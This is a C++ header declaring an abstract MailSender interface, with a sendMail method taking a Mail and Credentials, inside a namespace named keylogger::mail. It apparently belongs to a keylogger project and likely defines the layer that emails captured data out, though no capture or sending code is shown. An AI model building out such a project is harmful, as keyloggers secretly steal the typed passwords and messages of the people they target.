#pragma once

#include "Credentials.h"
#include "Mail.h"

namespace keylogger::mail
{
class MailSender
{
public:
    virtual ~MailSender() = default;

    virtual bool sendMail(const Mail&, const Credentials&) = 0;
};
}